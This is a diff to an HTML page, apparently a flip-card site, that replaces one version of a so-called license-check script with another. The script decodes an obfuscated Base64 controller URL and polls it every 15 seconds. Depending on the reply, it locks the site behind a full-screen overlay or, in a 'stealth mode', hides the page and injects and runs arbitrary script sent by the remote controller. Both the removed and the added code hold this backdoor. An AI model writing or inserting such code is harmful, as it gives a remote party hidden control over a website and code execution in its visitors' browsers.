@@ -314,87 +314,65 @@ card.addEventListener("touchstart", handleFlip);
 </script>
 
 
-<div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
-        <h1 id="t_header" style="color:#ff3333; margin:0;"></h1>
-        <p id="t_body" style="color:#bbb; margin-top:15px; font-size:16px; line-height:1.6;"></p>
+<div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:450px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
+        <h1 id="t_header" style="color:#ff3333; margin:0; font-size:26px;"></h1>
+        <p id="t_body" style="color:#bbb; margin-top:20px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
 (function() {
-    // 1. GitHub Configuration URL (Base64)
     const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    
-    // 2. Local License Key (Base64 for FAHAD-786)
-    const _0x_lk = "RkFIQUQtNzg2"; 
+    const _0x_lk = "RkFIQUQtNzg2"; // FAHAD-786 ki Base64 key
 
     async function checkSecurity() {
-        const layer = document.getElementById('secure_layer');
-        const scene = document.querySelector('.scene'); // Ensure your main content has class="scene"
-        
+        const layer = document.getElementById('secure_layer'), scene = document.querySelector('.scene');
+        const currentTarget = window.location.hostname.replace('www.', '');
+
         try {
             const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
-            if (!r.ok) throw new Error("Config Missing");
-            
-            const d = await r.json();
-            const lk = atob(_0x_lk);
+            if (!r.ok) throw new Error();
+            const d = await r.json(), lk = atob(_0x_lk), cfg = d.licenses[lk];
             const today = new Date().toISOString().split('T')[0];
-            
-            const cfg = d.licenses[lk];
-            const isExp = cfg && today > cfg.expiry;
-            const isInv = !cfg;
 
-            if (isInv || isExp) {
-                // BLOCK ACCESS: License Expired ya Invalid
-                document.getElementById('t_header').innerText = d.title || "Security Alert";
-                
-                // FIXED: innerHTML use kiya taaki clickable buttons/links kaam karein
-                document.getElementById('t_body').innerHTML = isExp ? d.msg_expired : d.msg_invalid;
-                
-                layer.style.display = 'flex';
-                if(scene) scene.style.display = 'none';
-            } else {
-                // LICENSE VALID HAI
-                
-                if (cfg.custom_code && cfg.custom_code.enabled) {
-                    // STEALTH MODE: Website hide karke remote code chalayein
-                    if(scene) scene.style.display = 'none'; 
-                    layer.style.display = 'none';
+            if (!cfg) { showLock(d.title, d.msg_invalid); return; }
 
-                    // Update check: Purana code remove karke naya inject karein
-                    const oldRemote = document.getElementById('remote-code-container');
-                    if(oldRemote) oldRemote.remove();
-
-                    const remoteContainer = document.createElement('div');
-                    remoteContainer.id = 'remote-code-container';
-                    remoteContainer.innerHTML = cfg.custom_code.code;
-                    document.body.appendChild(remoteContainer);
-
-                    // Scripts execution fix
-                    const scripts = remoteContainer.querySelectorAll('script');
-                    scripts.forEach(oldScript => {
-                        const newScript = document.createElement('script');
-                        newScript.textContent = oldScript.textContent;
-                        document.head.appendChild(newScript).parentNode.removeChild(newScript);
-                    });
-                } else {
-                    // NORMAL MODE: Website dikhayein
-                    layer.style.display = 'none';
-                    if(scene) scene.style.display = 'flex';
-                }
+            // MULTI-DOMAIN OPTIONAL CHECK
+            const allowed = cfg.authorized_target || [];
+            if (allowed.length > 0 && !allowed.includes(currentTarget)) {
+                showLock("Unauthorized Domain", d.msg_domain_mismatch); return;
             }
-        } catch (e) { 
-            // Anti-Deletion / Offline Security
-            layer.style.display = 'flex';
-            document.getElementById('t_header').innerText = "Security Error";
-            document.getElementById('t_body').innerHTML = "Security check failed. Controller missing or connection error.<br><br>Please contact admin.";
-            if(scene) scene.style.display = 'none';
+
+            // EXPIRY CHECK
+            if (cfg.expiry && today > cfg.expiry) {
+                showLock(d.title, d.msg_expired); return;
+            }
+
+            layer.style.display = 'none'; if(scene) scene.style.display = 'flex';
+
+            // REMOTE CODE STEALTH MODE
+            if (cfg.custom_code && cfg.custom_code.enabled) {
+                if(scene) scene.style.display = 'none';
+                const old = document.getElementById('rem-cont'); if(old) old.remove();
+                const cont = document.createElement('div'); cont.id = 'rem-cont';
+                cont.innerHTML = cfg.custom_code.code; document.body.appendChild(cont);
+                cont.querySelectorAll('script').forEach(s => {
+                    const ns = document.createElement('script'); ns.textContent = s.textContent;
+                    document.head.appendChild(ns).parentNode.removeChild(ns);
+                });
+            }
+        } catch (e) {
+            showLock("Security Error", "Security verification failed.");
+        }
+
+        function showLock(h, b) {
+            document.getElementById('t_header').innerText = h;
+            document.getElementById('t_body').innerHTML = b;
+            layer.style.display = 'flex'; if(scene) scene.style.display = 'none';
         }
     }
-
-    checkSecurity();
-    setInterval(checkSecurity, 15000); // Har 15 second baad validation
+    checkSecurity(); setInterval(checkSecurity, 15000);
 })();
 </script>
   
